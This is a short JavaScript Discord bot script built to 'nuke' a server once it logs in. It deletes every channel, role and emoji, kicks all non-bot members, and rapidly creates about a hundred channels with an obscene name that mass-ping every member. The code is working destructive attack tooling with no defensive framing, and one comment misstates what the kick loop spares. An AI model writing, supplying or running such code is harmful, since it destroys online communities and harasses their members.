const { Client, GatewayIntentBits } = require('discord.js');
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent
  ]
});

client.once('ready', () => {
  console.log('Bot is ready');
  
  // Get the server (you may need to specify which server)
  const guild = client.guilds.cache.first();
  
  // Delete all channels
  guild.channels.cache.forEach(channel => {
    channel.delete().catch(console.error);
  });
  
  // Create spam channels and ping everyone
  let channelCount = 0;
  const spamInterval = setInterval(() => {
    guild.channels.create({
      name: 'GET-FUCKED-LOL',
      type: 'GUILD_TEXT'
    }).then(channel => {
      channelCount++;
      if (channelCount > 100) clearInterval(spamInterval); // Stop after 100 channels
      
      guild.members.fetch().then(members => {
        const pingList = members.map(member => `<@${member.id}>`).join(' ');
        channel.send(pingList);
      });
    });
  }, 100); // Create a new channel every 100ms
  
  // Delete all roles (except @everyone)
  guild.roles.cache.forEach(role => {
    if (role.name !== '@everyone') {
      role.delete().catch(console.error);
    }
  });
  
  // Delete all emojis
  guild.emojis.cache.forEach(emoji => {
    emoji.delete().catch(console.error);
  });
  
  // Kick all members (except bot owners)
  guild.members.fetch().then(members => {
    members.forEach(member => {
      if (!member.user.bot) {
        member.kick().catch(console.error);
      }
    });
  });
});

client.login('YOUR_BOT_TOKEN');
